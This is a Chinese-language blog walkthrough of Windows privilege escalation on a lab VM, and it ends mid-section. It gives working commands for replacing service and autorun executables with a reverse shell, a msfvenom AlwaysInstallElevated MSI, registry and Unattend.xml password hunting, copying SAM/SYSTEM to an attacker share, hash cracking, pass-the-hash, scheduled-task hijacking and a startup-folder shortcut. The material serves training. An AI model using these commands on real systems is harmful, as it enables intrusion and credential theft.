class="line-numbers language-none"><code class="language-none">.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104725.png" alt="image-20210706161510487"></p><h5 id="3-创建可执行的原始服务的备份："><a href="#3-创建可执行的原始服务的备份：" class="headerlink" title="3.创建可执行的原始服务的备份："></a>3.创建可执行的原始服务的备份：</h5><pre class="line-numbers language-none"><code class="language-none">copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104726.png" alt="image-20210706161530749"></p><h5 id="4-复制可执行的反向外壳，以覆盖可执行的服务："><a href="#4-复制可执行的反向外壳，以覆盖可执行的服务：" class="headerlink" title="4.复制可执行的反向外壳，以覆盖可执行的服务："></a>4.复制可执行的反向外壳，以覆盖可执行的服务：</h5><pre class="line-numbers language-none"><code class="language-none">copy /Y C:\Users\user\Desktop\a002.exe "C:\Program Files\File Permissions Service\filepermservice.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104727.png" alt="image-20210706162117179"></p><h5 id="5-启动服务触发漏洞进行反弹shell："><a href="#5-启动服务触发漏洞进行反弹shell：" class="headerlink" title="5.启动服务触发漏洞进行反弹shell："></a>5.启动服务触发漏洞进行反弹shell：</h5><pre class="line-numbers language-none"><code class="language-none">net start filepermsvc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104728.png" alt="image-20210706162041312"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104729.png" alt="image-20210706162054309"></p><h1 id="0x06-注册表"><a href="#0x06-注册表" class="headerlink" title="0x06 注册表"></a>0x06 注册表</h1><h2 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h2><h3 id="前言-8"><a href="#前言-8" class="headerlink" title="前言"></a>前言</h3><p>Windows可以配置为在启动时运行命令， 拥有更高的特权。 </p><p>这些“自动运行”是在注册表中配置的。 如果我们可以写入自动运行可执行文件，并且 </p><p>能够重新启动系统(或等待系统重新启动)，可能会提升权限 </p><h3 id="实操-5"><a href="#实操-5" class="headerlink" title="实操"></a>实操</h3><h4 id="1-使用winPEAS-检查系统签发的自动运行可执行文件："><a href="#1-使用winPEAS-检查系统签发的自动运行可执行文件：" class="headerlink" title="1.使用winPEAS 检查系统签发的自动运行可执行文件："></a>1.使用winPEAS 检查系统签发的自动运行可执行文件：</h4><pre class="line-numbers language-none"><code class="language-none">.\winPEASany.exe quiet applicationsinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104730.png" alt="image-20210707163137620"></p><h4 id="2-或者，我们可以手动列举自动运行可执行项："><a href="#2-或者，我们可以手动列举自动运行可执行项：" class="headerlink" title="2.或者，我们可以手动列举自动运行可执行项："></a>2.或者，我们可以手动列举自动运行可执行项：</h4><pre class="line-numbers language-none"><code class="language-none">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后使用accesschk.exe来 验证每个权限 ：</p><pre class="line-numbers language-none"><code class="language-none">.\accesschk.exe /accepteula -wvu "C:\Program  Files\Autorun Program\program.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-发现”C-Program-Files-Autorun-Program-program-exe”自运行，可执行且可写入"><a href="#3-发现”C-Program-Files-Autorun-Program-program-exe”自运行，可执行且可写入" class="headerlink" title="3.发现”C:\Program Files\Autorun Program\program.exe”自运行，可执行且可写入"></a>3.发现”C:\Program Files\Autorun Program\program.exe”自运行，可执行且可写入</h4><p>创建原始备份：</p><pre class="line-numbers language-none"><code class="language-none">copy "C:\Program Files\Autorun Program\program.exe" C:\Temp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-用反向外壳去覆盖可执行的自运行："><a href="#4-用反向外壳去覆盖可执行的自运行：" class="headerlink" title="4.用反向外壳去覆盖可执行的自运行："></a>4.用反向外壳去覆盖可执行的自运行：</h4><pre class="line-numbers language-none"><code class="language-none">copy /Y C:\Users\user\Desktop\a002.exe "C:\Program Files\Autorun Program\program.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104731.png" alt="image-20210707165721683"></p><h4 id="5-重启虚拟机进行反弹shell"><a href="#5-重启虚拟机进行反弹shell" class="headerlink" title="5.重启虚拟机进行反弹shell"></a>5.重启虚拟机进行反弹shell</h4><p>这里要注意：</p><p>在 Windows 10 上，该漏洞似乎与上次登录的用户的权限一起运行，因此请注销”用户”帐户并首先登录为”管理员”帐户。</p><h2 id="始终安装相关"><a href="#始终安装相关" class="headerlink" title="始终安装相关"></a>始终安装相关</h2><h3 id="前言-9"><a href="#前言-9" class="headerlink" title="前言"></a>前言</h3><p>MSI 文件是用于安装应用程序的包文件。</p><p>这些文件运行时会获得尝试安装它们的用户的权限。</p><p>Windows允许使用高架（即管理员）权限运行这些安装程序。</p><p>如果是这样的话，我们可以生成一个包含反向外壳的MSI文件。</p><p>关键是必须启用两个注册处设置才能实现此功能。</p><p>本地机器的”始终安装”值必须设置为 1：  </p><p>local  machine: <code>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer </code></p><p>current user: <code>HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</code></p><p>如果其中任何一个不是1或被禁用，则漏洞将不起作用。</p><h3 id="实操-6"><a href="#实操-6" class="headerlink" title="实操"></a>实操</h3><h4 id="1-使用winPEAS-查看是否设置了两个注册表值："><a href="#1-使用winPEAS-查看是否设置了两个注册表值：" class="headerlink" title="1.使用winPEAS 查看是否设置了两个注册表值："></a>1.使用winPEAS 查看是否设置了两个注册表值：</h4><pre class="line-numbers language-none"><code class="language-none">.\winPEASany.exe quiet windowscreds<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-或者，手动验证值："><a href="#2-或者，手动验证值：" class="headerlink" title="2. 或者，手动验证值："></a>2. 或者，手动验证值：</h4><pre class="line-numbers language-none"><code class="language-none">reg query  HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer  /v AlwaysInstallElevated<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">reg query  HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer  /v AlwaysInstallElevated<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-使用msfvenom创建反向外壳"><a href="#3-使用msfvenom创建反向外壳" class="headerlink" title="3.使用msfvenom创建反向外壳"></a>3.使用msfvenom创建反向外壳</h4><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.175.130 LPORT=4444 -f msi -o a001.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104732.png" alt="image-20210707170414357"></p><h4 id="4-上传a001-msi到靶机，并在Kali上启动一个监听，并运行安装程序以触发漏洞："><a href="#4-上传a001-msi到靶机，并在Kali上启动一个监听，并运行安装程序以触发漏洞：" class="headerlink" title="4.上传a001.msi到靶机，并在Kali上启动一个监听，并运行安装程序以触发漏洞："></a>4.上传a001.msi到靶机，并在Kali上启动一个监听，并运行安装程序以触发漏洞：</h4><pre class="line-numbers language-none"><code class="language-none">msiexec /quiet /qn /i C:\Users\user\Desktop\a001.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104733.png" alt="image-20210707170553656"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104734.png" alt="image-20210707170620651"></p><h1 id="0x07-密码"><a href="#0x07-密码" class="headerlink" title="0x07 密码"></a>0x07 密码</h1><h2 id="前言-10"><a href="#前言-10" class="headerlink" title="前言"></a>前言</h2><p>管理员也会重复使用密码，或将其密码保留在一些可读位置的系统上。  </p><p>Windows 可能特别容易受到此影响，因为 Windows 存储密码的几个功能不安全</p><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><h3 id="前言-11"><a href="#前言-11" class="headerlink" title="前言"></a>前言</h3><p>大量程序在Windows注册表中存储配置选项。</p><p>Windows 本身有时会在注册处以纯文本存储密码。</p><p>我们可以在注册表处搜索密码</p><h3 id="搜索注册表处的密码"><a href="#搜索注册表处的密码" class="headerlink" title="搜索注册表处的密码"></a>搜索注册表处的密码</h3><p>以下命令将搜索注册表中包含”密码”的密钥和值</p><pre class="line-numbers language-none"><code class="language-none">reg query HKLM /f password /t REG_SZ /s  #本地机器注册表项reg query HKCU /f password /t REG_SZ /s #当前用户注册表项<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="实操-7"><a href="#实操-7" class="headerlink" title="实操"></a>实操</h3><h4 id="1-使用winPEAS-检查常见密码位置："><a href="#1-使用winPEAS-检查常见密码位置：" class="headerlink" title="1.使用winPEAS 检查常见密码位置："></a>1.使用winPEAS 检查常见密码位置：</h4><pre class="line-numbers language-none"><code class="language-none">.\winPEASany.exe quiet filesinfo userinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（最终检查需要很长时间才能完成）</p><h4 id="2-查看信息"><a href="#2-查看信息" class="headerlink" title="2.查看信息"></a>2.查看信息</h4><h4 id="3-我们可以手动验证这些：-查询注册表"><a href="#3-我们可以手动验证这些：-查询注册表" class="headerlink" title="3.我们可以手动验证这些：(查询注册表)"></a>3.我们可以手动验证这些：(查询注册表)</h4><pre class="line-numbers language-none"><code class="language-none">reg query "HKLM\Software\Microsoft\Windows  NT\CurrentVersion\winlogon" reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="4-使用-winexe-使用凭据远程连接外壳"><a href="#4-使用-winexe-使用凭据远程连接外壳" class="headerlink" title="4.使用 winexe 使用凭据远程连接外壳"></a>4.使用 winexe 使用凭据远程连接外壳</h4><pre class="line-numbers language-none"><code class="language-none">winexe -U 'admin%password123' //192.168.175.245 cmd.exewinexe -U 'admin%password123' --system //192.168.175.245 cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>针对winexe的连接报错</p><pre class="line-numbers language-none"><code class="language-none">Win7上修改1.关闭防火墙；2.Win+R&gt;secpol.msc &gt;本地策略&gt;安全选项&gt;网络访问:本地帐户的共享和安全模型：经典-对本地用户进行身份验证，不改变其本来身份；3.以管理员身份执行cmd，输入以下命令：reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\system" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104735.png" alt="image-20210707171706828"></p><h2 id="信用"><a href="#信用" class="headerlink" title="信用"></a>信用</h2><p>Windows 具有runas 命令，允许用户使用其他用户的权限运行命令。</p><p>这通常需要了解其他用户的密码。</p><p>但是，Windows 还允许用户将其凭据保存到系统，这些保存的凭据可用于绕过此要求。</p><p>那么我们可以尝试去窃取这些凭据</p><h3 id="1-使用winPEAS检查保存的凭据："><a href="#1-使用winPEAS检查保存的凭据：" class="headerlink" title="1.使用winPEAS检查保存的凭据："></a>1.使用winPEAS检查保存的凭据：</h3><pre class="line-numbers language-none"><code class="language-none">.\winPEASany.exe quiet cmd windowscreds<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104736.png" alt="image-20210722222104913"></p><h3 id="2-似乎存在为管理员用户保存的凭据"><a href="#2-似乎存在为管理员用户保存的凭据" class="headerlink" title="2.似乎存在为管理员用户保存的凭据"></a>2.似乎存在为管理员用户保存的凭据</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104737.png" alt="image-20210722223737745"></p><h3 id="3-我们可以使用以下命令手动验证此命令"><a href="#3-我们可以使用以下命令手动验证此命令" class="headerlink" title="3.我们可以使用以下命令手动验证此命令"></a>3.我们可以使用以下命令手动验证此命令</h3><pre class="line-numbers language-none"><code class="language-none">cmdkey /list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104738.png" alt="image-20210707171824833"></p><h3 id="4-如果未保存的凭据，则运行以下脚本以刷新凭据："><a href="#4-如果未保存的凭据，则运行以下脚本以刷新凭据：" class="headerlink" title="4.如果未保存的凭据，则运行以下脚本以刷新凭据："></a>4.如果未保存的凭据，则运行以下脚本以刷新凭据：</h3><pre class="line-numbers language-none"><code class="language-none">savecred.bat <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-使用保存的凭据作为管理员用户运行任何命令，进行反弹shell-问题"><a href="#5-使用保存的凭据作为管理员用户运行任何命令，进行反弹shell-问题" class="headerlink" title="5.使用保存的凭据作为管理员用户运行任何命令，进行反弹shell 问题"></a>5.使用保存的凭据作为管理员用户运行任何命令，进行反弹shell 问题</h3><pre class="line-numbers language-none"><code class="language-none">runas /savecred /user:admin C:\Users\user\Desktop\a002.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><h3 id="前言-12"><a href="#前言-12" class="headerlink" title="前言"></a>前言</h3><p>某些管理员会在系统上留下包含密码的配置文件</p><p><code>Unattend.xml</code>文件就是一个例子</p><p>它允许对 Windows 系统进行大部分自动化设置</p><h3 id="搜索配置文件"><a href="#搜索配置文件" class="headerlink" title="搜索配置文件"></a>搜索配置文件</h3><p> 递归式搜索当前目录中以<code>pass</code>为名的文件，或以<code>.config</code>结尾：</p><pre class="line-numbers language-none"><code class="language-none">dir /s *pass* == *.config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>递归式搜索当前目录中包含”password”一词的文件，最后也以任何一个<code>.xml</code>，<code>.ini</code>，<code>.txt</code></p><pre class="line-numbers language-none"><code class="language-none">findstr /si password *.xml *.ini *.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="实操-8"><a href="#实操-8" class="headerlink" title="实操"></a>实操</h3><h3 id="1-使用winPEAS-搜索可能包含凭据的常见文件："><a href="#1-使用winPEAS-搜索可能包含凭据的常见文件：" class="headerlink" title="1.使用winPEAS 搜索可能包含凭据的常见文件："></a>1.使用winPEAS 搜索可能包含凭据的常见文件：</h3><pre class="line-numbers language-none"><code class="language-none">.\winPEASany.exe quiet cmd searchfast filesinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104739.png" alt="image-20210709143123965"></p><h3 id="2-发现Unattend-xml文件"><a href="#2-发现Unattend-xml文件" class="headerlink" title="2. 发现Unattend.xml文件"></a>2. 发现Unattend.xml文件</h3><pre class="line-numbers language-none"><code class="language-none">type C:\Windows\Panther\Unattend.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-发现了管理员用户的账号密码"><a href="#3-发现了管理员用户的账号密码" class="headerlink" title="3. 发现了管理员用户的账号密码"></a>3. 发现了管理员用户的账号密码</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104740.png" alt="image-20210709143447091"></p><p>它是base64编码的</p><pre class="line-numbers language-none"><code class="language-none">cGFzc3dvcmQxMjM=Admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-在kali进行解码："><a href="#4-在kali进行解码：" class="headerlink" title="4. 在kali进行解码："></a>4. 在kali进行解码：</h3><pre class="line-numbers language-none"><code class="language-none">echo "cGFzc3dvcmQxMjM=" | base64 -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104741.png" alt="image-20210709143623196"></p><h3 id="5-使用winexe进行反弹shell"><a href="#5-使用winexe进行反弹shell" class="headerlink" title="5. 使用winexe进行反弹shell"></a>5. 使用winexe进行反弹shell</h3><pre class="line-numbers language-none"><code class="language-none">winexe -U 'admin%password123' //192.168.175.245 cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104742.png" alt="image-20210709143744026"></p><h2 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h2><h3 id="前言-13"><a href="#前言-13" class="headerlink" title="前言"></a>前言</h3><p>Windows 在安全帐户管理器 （SAM） 中存储密码。</p><p>这些哈希用一个密钥加密，该密钥可以在SYSTEM的文件中找到。</p><p>如果您有能力读取SAM和系统文件，则可以提取哈希</p><h3 id="SAM-SYSTEM-Locations"><a href="#SAM-SYSTEM-Locations" class="headerlink" title="SAM/SYSTEM Locations"></a>SAM/SYSTEM Locations</h3><p>SAM和SYSTEM文件位于<code>C:\Windows\System32\config directory</code></p><p>在 Windows 运行时，文件已锁定。</p><p>文件的备份可能存在于<code>C:\Windows\Repair</code>  or <code>C:\Windows\System32\config\RegBack directories</code></p><h3 id="实操-9"><a href="#实操-9" class="headerlink" title="实操"></a>实操</h3><h4 id="1-SAM和SYSTEM文件的备份进行读取"><a href="#1-SAM和SYSTEM文件的备份进行读取" class="headerlink" title="1. SAM和SYSTEM文件的备份进行读取"></a>1. SAM和SYSTEM文件的备份进行读取</h4><h4 id="2-进行复制"><a href="#2-进行复制" class="headerlink" title="2. 进行复制"></a>2. 进行复制</h4><pre class="line-numbers language-none"><code class="language-none">copy C:\Windows\Repair\SAM  \\192.168.175.130\tools\ copy C:\Windows\Repair\SYSTEM  \\192.168.175.130\tools\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3-下载信用套件："><a href="#3-下载信用套件：" class="headerlink" title="3. 下载信用套件："></a>3. 下载信用套件：</h4><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/Neohapsis/creddump7.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-运行对SAM和系统文件的工具来提取哈希："><a href="#4-运行对SAM和系统文件的工具来提取哈希：" class="headerlink" title="4. 运行对SAM和系统文件的工具来提取哈希："></a>4. 运行对SAM和系统文件的工具来提取哈希：</h4><pre class="line-numbers language-none"><code class="language-none">python2 creddump7/pwdump.py SYSTEM SAM<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-使用hashcat破解管理员用户哈希："><a href="#5-使用hashcat破解管理员用户哈希：" class="headerlink" title="5.使用hashcat破解管理员用户哈希："></a>5.使用hashcat破解管理员用户哈希：</h4><pre class="line-numbers language-none"><code class="language-none">hashcat -m 1000 --force  a9fdfa038c4b75ebc76dc855dd74f0da  /usr/share/wordlists/rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><h3 id="前言-14"><a href="#前言-14" class="headerlink" title="前言"></a>前言</h3><p>Windows 接受哈希斯而不是密码来验证许多服务。</p><p>我们可以使用经过修改的winexe，即pth-winexe，使用管理员用户的哈希生成命令提示</p><h3 id="实操-10"><a href="#实操-10" class="headerlink" title="实操"></a>实操</h3><h4 id="1-从上一步中的SAM中提取管理员哈希。"><a href="#1-从上一步中的SAM中提取管理员哈希。" class="headerlink" title="1. 从上一步中的SAM中提取管理员哈希。"></a>1. 从上一步中的SAM中提取管理员哈希。</h4><h4 id="2-使用带pth-winexe-的哈希来生成命令提示："><a href="#2-使用带pth-winexe-的哈希来生成命令提示：" class="headerlink" title="2. 使用带pth-winexe 的哈希来生成命令提示："></a>2. 使用带pth-winexe 的哈希来生成命令提示：</h4><pre class="line-numbers language-none"><code class="language-none">pth-winexe -U  'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c 4b75ebc76dc855dd74f0da' //192.168.175.228 cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-使用带pth-winexe的哈希产生SYSTEM"><a href="#3-使用带pth-winexe的哈希产生SYSTEM" class="headerlink" title="3. 使用带pth-winexe的哈希产生SYSTEM"></a>3. 使用带pth-winexe的哈希产生SYSTEM</h4><pre class="line-numbers language-none"><code class="language-none">pth-winexe --system -U  'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c 4b75ebc76dc855dd74f0da' //192.168.175.228 cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Scheduled-Tasks"><a href="#Scheduled-Tasks" class="headerlink" title="Scheduled  Tasks"></a>Scheduled  Tasks</h1><h2 id="预定任务"><a href="#预定任务" class="headerlink" title="预定任务"></a>预定任务</h2><h3 id="前言-15"><a href="#前言-15" class="headerlink" title="前言"></a>前言</h3><p> Windows 可以配置为在特定时间（例如 每 5 分钟）或由某个事件触发（例如用户登录）运行任务。</p><p>任务通常使用创建它们的用户的权限运行，但管理员可以配置以其他用户（包括系统）身份运行</p><h3 id="基本命令-1"><a href="#基本命令-1" class="headerlink" title="基本命令"></a>基本命令</h3><p>没有简单的方法来枚举属于其他用户作为低特权用户帐户。</p><p>列出用户可以看到的所有计划任务：</p><pre class="line-numbers language-none"><code class="language-none">schtasks /query /fo LIST /v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在PowerShell中：</p><pre class="line-numbers language-none"><code class="language-none">Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通常我们必须依赖于其他条件，例如找到一个脚本或日志文件来指示正在运行计划任务。</p><h3 id="实操-11"><a href="#实操-11" class="headerlink" title="实操"></a>实操</h3><h4 id="1-在C-DevTools目录中，有一个名为CleanUp-ps1的PowerShell脚本。查看脚本："><a href="#1-在C-DevTools目录中，有一个名为CleanUp-ps1的PowerShell脚本。查看脚本：" class="headerlink" title="1. 在C:\DevTools目录中，有一个名为CleanUp.ps1的PowerShell脚本。查看脚本："></a>1. 在C:\DevTools目录中，有一个名为<code>CleanUp.ps1</code>的PowerShell脚本。查看脚本：</h4><pre class="line-numbers language-none"><code class="language-none">type C:\DevTools\CleanUp.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104743.png" alt="image-20210709143850738"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104744.png" alt="image-20210709143906703"></p><h4 id="2-此脚本似乎以系统用户的身份运行每分钟。我们可以使用accesschk-exe检查本脚本权限"><a href="#2-此脚本似乎以系统用户的身份运行每分钟。我们可以使用accesschk-exe检查本脚本权限" class="headerlink" title="2. 此脚本似乎以系统用户的身份运行每分钟。我们可以使用accesschk.exe检查本脚本权限"></a>2. 此脚本似乎以系统用户的身份运行每分钟。我们可以使用accesschk.exe检查本脚本权限</h4><pre class="line-numbers language-none"><code class="language-none">C:\Users\user\Desktop\accesschk.exe /accepteula -quvw user  C:\DevTools\CleanUp.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看来我们有能力写到这个文件。</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104745.png" alt="image-20210709144146284"></p><h4 id="3-备份脚本："><a href="#3-备份脚本：" class="headerlink" title="3. 备份脚本："></a>3. 备份脚本：</h4><pre class="line-numbers language-none"><code class="language-none">copy C:\DevTools\CleanUp.ps1 C:\Temp\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-kali进行监听"><a href="#4-kali进行监听" class="headerlink" title="4. kali进行监听"></a>4. kali进行监听</h4><h4 id="5-使用echo将对反向shell可执行文件的调用附加到脚本末尾："><a href="#5-使用echo将对反向shell可执行文件的调用附加到脚本末尾：" class="headerlink" title="5.  使用echo将对反向shell可执行文件的调用附加到脚本末尾："></a>5.  使用echo将对反向shell可执行文件的调用附加到脚本末尾：</h4><pre class="line-numbers language-none"><code class="language-none">echo C:\Users\user\Desktop\a002.exe &gt;&gt;  C:\DevTools\CleanUp.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104746.png" alt="image-20210709144339005"></p><h4 id="6-等待预定任务运行-它应该运行每分钟-进行反弹shell"><a href="#6-等待预定任务运行-它应该运行每分钟-进行反弹shell" class="headerlink" title="6. 等待预定任务运行(它应该运行每分钟)进行反弹shell"></a>6. 等待预定任务运行(它应该运行每分钟)进行反弹shell</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104747.png" alt="image-20210709144400963"></p><h1 id="GUI"><a href="#GUI" class="headerlink" title="GUI"></a>GUI</h1><h2 id="不安全的-GUI-应用程序"><a href="#不安全的-GUI-应用程序" class="headerlink" title="不安全的 GUI 应用程序"></a>不安全的 GUI 应用程序</h2><h3 id="前言-16"><a href="#前言-16" class="headerlink" title="前言"></a>前言</h3><p>在某些（较旧）版本的 Windows 中，用户可以获得使用管理员权限运行某些 GUI 应用的权限。</p><p>通常有许多方法可以生成来自GUI应用内的命令提示，包括使用原生 Windows 功能。</p><p>Since 父过程运行时具有管理员权限，生成的命令提示也将运行这些权限</p><h2 id="实操-12"><a href="#实操-12" class="headerlink" title="实操"></a>实操</h2><h3 id="1-使用user的GUI登录Windows虚拟机-账户"><a href="#1-使用user的GUI登录Windows虚拟机-账户" class="headerlink" title="1.  使用user的GUI登录Windows虚拟机 账户"></a>1.  使用<code>user</code>的GUI登录Windows虚拟机 账户</h3><h3 id="2-双击桌面上的”AdminPaint”快捷方式"><a href="#2-双击桌面上的”AdminPaint”快捷方式" class="headerlink" title="2. 双击桌面上的”AdminPaint”快捷方式"></a>2. 双击桌面上的”AdminPaint”快捷方式</h3><h3 id="3-打开cmd并运行："><a href="#3-打开cmd并运行：" class="headerlink" title="3. 打开cmd并运行："></a>3. 打开cmd并运行：</h3><pre class="line-numbers language-none"><code class="language-none">tasklist /V | findstr mspaint.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到这个<code>mspaint.exe</code>是运行管理员的特权</p><h3 id="4-在-绘图中，-单击”文件”，然后-打开。"><a href="#4-在-绘图中，-单击”文件”，然后-打开。" class="headerlink" title="4. 在 绘图中， 单击”文件”，然后 打开。"></a>4. 在 绘图中， 单击”文件”，然后 打开。</h3><h3 id="5-在导航输入中，将内容替换为："><a href="#5-在导航输入中，将内容替换为：" class="headerlink" title="5.在导航输入中，将内容替换为："></a>5.在导航输入中，将内容替换为：</h3><pre class="line-numbers language-none"><code class="language-none">file://c:/windows/system32/cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令提示符应该打开以管理员权限运行</p><h1 id="启动应用程序"><a href="#启动应用程序" class="headerlink" title="启动应用程序"></a>启动应用程序</h1><h2 id="前言-17"><a href="#前言-17" class="headerlink" title="前言"></a>前言</h2><p> 每个用户都可以通过设置特定目录中的快捷方式。 </p><p> Windows还有一个应用程序的启动目录，所有应用程序都应该启动 </p><p> 用户： </p><pre class="line-numbers language-none"><code class="language-none">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 如果我们可以在这个目录中创建文件，我们就可以使用反弹shell</p><p> 管理员登录时可执行和升级权限。 </p><p>这里我们要注意：必须使用快捷方式文件<code>.lnk</code></p><p>提供一个VBScript脚本进行创建快捷方式文件</p><pre class="line-numbers language-none"><code class="language-none">Set oWS = WScript.CreateObject("WScript.Shell") sLinkFile = "C:\ProgramData\Microsoft\Windows\Start  Menu\Programs\StartUp\reverse.lnk" Set oLink = oWS.CreateShortcut(sLinkFile) oLink.TargetPath = "C:\Users\user\Desktop\a002.exe" oLink.Save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="实操-13"><a href="#实操-13" class="headerlink" title="实操"></a>实操</h2><h3 id="1-使用accesschk-exe检查启动时的权限目录："><a href="#1-使用accesschk-exe检查启动时的权限目录：" class="headerlink" title="1.使用accesschk.exe检查启动时的权限目录："></a>1.使用accesschk.exe检查启动时的权限目录：</h3><pre class="line-numbers language-none"><code class="language-none">.\accesschk.exe /accepteula -d  "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210723104748.png" alt="image-20210723101046654"></p><h3 id="2-建立用户组可以编写此目录的访问"><a href="#2-建立用户组可以编写此目录的访问" class="headerlink" title="2.建立用户组可以编写此目录的访问"></a>2.建立用户组可以编写此目录的访问</h3><h3 id="3-使用VBScript创建文件CreateShortcut-vbs"><a href="#3-使用VBScript创建文件CreateShortcut-vbs" class="headerlink" title="3.使用VBScript创建文件CreateShortcut.vbs"></a>3.使用VBScript创建文件CreateShortcut.vbs</h3><p>可以更改文件的路径</p><h3 id="4-使用cscript运行脚本"><a href="#4-使用cscript运行脚本" class="headerlink" 